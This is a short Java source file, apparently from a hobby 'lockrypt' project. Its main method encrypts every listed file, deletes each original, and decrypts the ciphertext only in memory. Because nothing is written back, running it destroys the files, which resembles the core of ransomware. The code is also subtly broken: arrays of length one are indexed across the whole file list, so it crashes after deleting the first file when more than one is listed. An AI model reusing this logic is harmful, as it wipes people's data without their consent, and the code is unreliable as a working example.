package main.java;
import main.java.AdvancedEncryption;
import main.java.fileManager;
import main.java.blockchain.*;
public class lockrypt {
    public static void main(String[] args) throws Exception{ 
        AdvancedEncryption AE=new AdvancedEncryption();
        fileManager FM=new fileManager();
        block_chain.Create_Blockchain();
        byte[][] cipher=new byte[1][];
        byte[][] decipher=new byte[1][];
        for(int i=0;i<FM.fileList.length;i++){
            FM.getFileBytes(FM.fileList[i]);
        }
        for(int i=0;i<FM.fileList.length;i++){
            cipher[i]=AE.encrypt(FM.fileBytes[i]);
            String ciphertext=new String(cipher[i]);
            //block_chain.Add_Block(ciphertext);
            FM.deleteFile(FM.fileList[i]);
            //System.out.println(new String(cipher[i]));
        }
        for(int i=0;i<FM.fileList.length;i++){
            
            decipher[i]=AE.decrypt(cipher[i]);
            //System.out.println(new String(decipher[i]));
        }
    }
}